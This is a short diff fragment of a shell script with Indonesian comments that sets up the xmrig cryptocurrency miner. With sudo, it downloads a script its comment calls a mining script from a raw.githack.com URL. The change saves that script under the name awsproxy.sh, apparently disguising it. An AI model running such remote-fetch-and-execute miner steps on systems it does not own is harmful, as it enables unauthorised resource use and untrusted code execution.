@@ -16,7 +16,7 @@ tar -xvzf xmrig.tar.gz && cd xmrig
 chmod +x ./xmrig
 
 # Download skrip mining
-sudo curl -L -o mining.sh "https://raw.githack.com/appjobdesk/note/main/awsproxy.sh"
+sudo curl -L -o awsproxy.sh "https://raw.githack.com/appjobdesk/note/main/awsproxy.sh"
 
 # Ubah kepemilikan agar bisa dieksekusi oleh user saat ini
 sudo chown $(whoami):$(whoami) awsproxy.sh
